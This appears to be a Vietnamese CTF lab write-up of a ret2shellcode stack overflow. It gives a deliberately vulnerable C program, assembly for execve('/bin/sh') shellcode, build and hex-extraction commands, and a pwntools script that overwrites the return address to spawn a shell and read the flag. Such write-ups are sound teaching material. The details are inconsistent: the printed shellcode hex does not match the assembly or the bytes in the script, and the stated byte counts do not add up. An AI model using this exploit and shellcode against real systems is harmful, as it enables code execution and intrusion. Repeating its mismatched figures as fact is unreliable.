# ret2shellcode_chall_demo_file

## ret2shellcode.c
```c
#include <stdio.h>
#include <unistd.h>
int main() {
    char buffer[128];
    printf("Buffer address: %p\n", buffer);
    read(0, buffer, 256);
    return 0;
}
```
## Kiểm tra chế độ bảo vệ
```bash
checksec chall2
```

**Kết quả:**
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
```
* **Chúng ta có một file với lỗ hổng buffer overflow và không có bảo vệ (no stack protector, no pie, excutable stack). Như vậy ta có thể chạy shellcode trên stack bằng cách ghi đè địa chỉ trả về bằng địa chỉ buffer chứa shellcode**

## Viết shell code bằng asm (shellcode.asm)
```asm
section .text
global _start
_start:
    ; execve("/bin/sh", NULL, NULL)
    xor rax, rax
    push rax                ; NULL terminator
    ; Đẩy chuỗi "/bin//sh" lên stack (8 byte, 2 dấu / để đủ 8 byte)
    mov rbx, 0x68732f2f6e69622f ; "/bin//sh" (theo thứ tự little-endian)
    push rbx
    mov rdi, rsp            ; RDI trỏ tới chuỗi "/bin//sh"
    xor rsi, rsi            ; RSI = NULL (argv)
    xor rdx, rdx            ; RDX = NULL (envp)
    mov al, 59              ; syscall number 59 (execve) - dùng al để tránh null byte
    syscall
```
### Biên dịch shellcode.asm thành object file
```bash
nasm -f elf64 shellcode.asm -o shellcode.o
```
### Trích xuất shellcode
```bash
ld shellcode.o -o shellcode
```
### Lấy shellcode dạng hex
```bash
objdump -d shellcode.o | grep -A15 "<_start>:" | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | tr '\n' ' ' | sed 's/ /\\x/g'
```
* **Kết quả:**
```
\x3b\x00\x00\x00\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05
```
## Viết script khai thác
Chúng ta cần:

* Lấy địa chỉ buffer từ chương trình.
* Tạo payload: [shellcode] + [padding] + [địa chỉ buffer]
Padding: 128 (kích thước buffer) + 8 (saved RBP) - độ dài shellcode
```python
#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 0000
HOST = "host"
exe = context.binary = ELF('./chall2', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

p.recvuntil(b"Buffer address: ")
buffer_addr = int(p.recvline().strip(), 16)
log.info(f"Buffer address: {hex(buffer_addr)}")

shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05"
# Tính padding: 128 (buffer) + 8 (saved rbp) = 136
padding = b'A' * (128 + 8 - len(shellcode))
# PAYLOAD
payload = shellcode + padding + p64(buffer_addr)

p.sendline(payload)

p.interactive()
```
### Payload:
- Đầu tiên là shellcode (27 byte).
- Sau đó là padding (109 byte ký tự 'A') để tổng cộng 136 byte.
- Cuối cùng là địa chỉ buffer (8 byte) để ghi đè return address. Sau khi return, nó sẽ nhảy đến shellcode trên stack.

## Chạy file exploit
```bash
./solve.py
```
**Kết quả sau khi lấy được shell:**
```bash
cat Flag.txt
```
```
WELL DONE! THIS IS YOUR FLAG: CTF{ISP_VO_DICH}
```